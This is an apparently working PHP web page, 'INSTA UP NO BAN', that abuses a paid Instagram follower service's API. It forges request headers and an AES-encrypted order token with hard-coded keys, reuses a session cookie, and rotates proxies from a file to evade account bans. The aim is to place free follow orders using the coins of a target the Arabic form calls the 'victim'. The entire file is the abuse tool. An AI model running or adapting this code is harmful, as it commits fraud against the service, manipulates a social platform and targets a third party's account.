


<html>
   <head>
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
<style type="text/css">@import url('https://fonts.googleapis.com/css?family=Poppins');
/* BASIC */

:root { --main-color: #fe9091; --shadow-color: rgba(20,200, 200, 8.4);}
body { width: 100%; height: 10vh; background-image: linear-gradient(50deg, var(--main-color) 70%, #ffffff 60%); background-repeat: no-repeat; }


img { width: 25%; margin: 20px auto 5px auto; padding-top: 30px; display: block;}



input[type=text],select { background-color: #fffff; border: none; color: #f0d0d; padding: 12px 32px; text-align: left; text-decoration: none; display: block; font-size: 40px; margin: 9px auto; width: 85%; border: 10px solid #f6f6f6; -webkit-transition: all 0.5s ease-in-out; -moz-transition: all 0.5s ease-in-out; -ms-transition: all 0.5s ease-in-out; -o-transition: all 0.5s ease-in-out;}

input[type=button], input[type=submit], input[type=reset] { background-color: border: color: pink; color: red; letter-spacing: 1px; padding: 20px 50px; text-align: center; text-decoration: none; display: block; text-transform: uppercase; font-size: 13px; -webkit-box-shadow: 0 10px 30px 0 var(--shadow-color); box-shadow: 0 10px 30px 0 var(--shadow-color); -webkit-border-radius: 5px 5px 5px 5px; border-radius: 5px 5px 5px 5px; margin: 5px auto 35px auto; -webkit-transition: all 0.3s ease-in-out; -moz-transition: all 0.3s ease-in-out; -ms-transition: all 0.3s ease-in-out; -o-transition: all 0.3s ease-in-out; transition: all 0.3s ease-in-out; cursor: pointer;}



</style>
     </head>
<body>

 <?php

echo "   
<br>
<br>     
<br>
<br>     
<br>
<br>
<br>     
<br>
<br>     
<br>
<br>     
<br>
<br>
<center><h1>INSTA UP NO BAN<span></span></h1></center>
<br>
<br>
<br>     
<br>
<br>     
<br>
<br> 
";

if(isset($_GET['submit'])){
	$uidx=$_GET['uid'];
    $uid=$_GET['oid'];
    $fille='proxy.txt';



  
 function RandomNumber($length){
    $str="";
    for($i=0;$i<$length;$i++){
    $str.=mt_rand(0,9);
    }
    return $str;
    }
    
    
    function rando($length) {
        $characters = '1234567890abcdefghijklmnopqrstuvwxyz';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }



  $x16=rando(16);
$x40=rando(40);

$ts=time();
$f = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","suman","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$fname = $f[mt_rand(0,50)];
$l = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$lname = $l[mt_rand(0,50)];
$no = rand(1,999);
$name=''.$fname.''.$lname.''.$no.'';


$url1='https://instaup.marsapi.com/get_likes/user/coins';



$data0='market=Bazaar&user_id='.$uid.'&iad='.$x40.'&user_name='.$name;

$a1 = RandomNumber(2);
$a2 = RandomNumber(2);
$a3 = RandomNumber(2);
$a4 = RandomNumber(2);
$ipz = $a1.'.'.$a2.'.'.$a3.'.'.$a4;


$access=md5('45:8D:2E:5C:3A:B4:02:2D:B5:DD:3B:E0:98:4F:14:90:CB:5F:B5:45'.$uid);


$headers1=['Xiaomi:29:M2007J20CI',
'access: '.$access,
'lng: en',
'cnt:in',
'versionName:17.0.1',
'version:90',
'pkg:f2c6d7a5b030a1542f7eb589d5013340',
'enMarket:EnglishWebPayment',
'market:PlayStore',
'uid:'.$uid,
'api_key: ABCXYZ123TEST',
'crc:4653145854/23927768',
"Nagent:0/02:00:00:00:00:00/48/de2b83032671b409/0/de7d6788fcf061b1341cf0661af36fe35ec72647",
'dsl:36f9a8e7',
'aid:de7d6788fcf061b1341cf0661af36fe35ec72647',
'special-user:1',
'Host:instaup.marsapi.com',
'Connection:Keep-Alive',
'Accept-Encoding:gzip',
'cookie:  token=cViH9GRCjwoeLdKMfAtxvy0NzuJYh4aXSQsg76krU2pBqZ3PnlFETDWI15bmO857717309176',];
$fiile = fopen($fille, 'r');
$proy = explode("\n", fgets($fiile))[0];
$proxy = explode(':', $proy);


	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,$url1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_PROXY, $proxy[0]);
  curl_setopt($ch, CURLOPT_PROXYPORT, $proxy[1]);
    curl_setopt($ch, CURLOPT_POSTFIELDS,$data0);
	   curl_setopt($ch, CURLOPT_HTTPHEADER,$headers1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
	$output1= curl_exec ($ch);
	
	curl_close ($ch);
  
   $json1=json_decode($output1,true);
  $c1=$json1['coins'];
  $c2=$json1['message'];
  $d1 = $c1 / 4;
  $d2 = explode(".",$d1)['0'];
      $url0="https://instaup.marsapi.com/get_likes/order/follow";
  $idx=$uid+3423;
  $d=$idx.'ig';

$i='3rFz>|)VHl-w+5I0';

if($d2 > 1000){
$d2 = '1000';
} else {
$d2 = $d2;
}

  $k='#p0yJmVK/@($nX?#';
$enc_data = base64_encode(openssl_encrypt($d,"AES-128-CBC",$k,OPENSSL_RAW_DATA,$i));
$tkv=md5($enc_data.':M3JGej58KVZIbC13KzVJMA==');





$dx=urlencode($dx);


$ll='https%3A%5C%2F%5C%2Finstagram.fccu3-1.fna.fbcdn.net%5C%2Fv%5C%2Ft51.2885-15%5C%2Fe35%5C%2Fs150x150%5C%2F264420143_435496831548995_8076441957316773167_n.jpg%3F_nc_ht%3Dinstagram.fccu3-1.fna.fbcdn.net%26_nc_cat%3D111%26_nc_ohc%3DvWrY6qsKOOAAX9ZgJLH%26edm%3DAPU89FABAAAA%26ccb%3D7-4%26oh%3D00_AT_GHVnpr10j1bCs8Dx5unohvTyp_1DgOtu8It7P_Nmpfw%26oe%3D61B616B1%26_nc_sid%3D86f79a';

 $data0='gift=0&order_count='.$d2.'&user_id='.$uid.'&tokenV2='.$tkv.'&start_value=1700&media_url=%7B%22media_url%22%3A%22'.$ll.'%22%2C%22user_name%22%3A%22'.$fname.'%22%7D&order_id='.$uidx;

 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url0);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS,$data0);
 curl_setopt($ch, CURLOPT_PROXY, $proxy[0]);
 curl_setopt($ch, CURLOPT_PROXYPORT, $proxy[1]);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HTTPHEADER,$headers1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
  $cc= curl_exec ($ch);
 curl_close ($ch);
    $jsonn=json_decode($cc,true);
   $c=$jsonn['status'];
  
    if($c == 'Error'  && $c2 == 'Your account suspended due to unfollowing. If you think there is a mistake, call us at instaup.developers@gmail.com.'){
     $current = file_get_contents($fille);
    file_put_contents($fille, $current);
    $lines = file($fille);
    unset($lines[0]);
    file_put_contents($fille, implode('', $lines));
echo "<div class='success'><center>
<font color='green'><hr>$output1:البروكسي انحظر يتم الان تغيير بروكسي<hr>
<font color='red'><hr>$cc<hr></font></center></div>";
}elseif($c == 'Error'){
echo "<div class='success'><center>
<font color='green'><hr>$output1:
<font color='red'><hr>$cc:<hr></font></center></div>";
}elseif($c == 'Successful'){
echo "<div class='success'><center>
<font color='green'><hr>$output1: نقاطك 
<font color='red'><hr>تم رشق:$d2<hr></font></center></div>";
}else {
$current = file_get_contents($fille);
file_put_contents($fille, $current);
$lines = file($fille);
unset($lines[0]);
file_put_contents($fille, implode('', $lines));
echo "<div class='success'><center>
<font color='green'><hr><h2>$output1: بروكسي ضعيف جدا الان يتم تغيرة</h2>
<font color='red'><hr><h2>$cc</h2><hr></font></center></div>";
}

}
	
if(!isset($_GET['submit']))
	{
	?>
<form action='' method='get'>	
					<input type='text' name='oid' placeholder='ادخل ايدي الضحيه'  required>	
					<input type='text' name='uid' placeholder='ادخل ايديك '  required>	
      <input type="submit" name='submit' value='موافق'
	<?php
	}
?>

?>

</center>

 
 </html>

<div class="container p-2 text-center">
			
		
			<a class="underlineHover" href="https://t.me/Glo0olG">مطور الايبي</h2></a>
        <p class="text-muted p-5">
      </div>
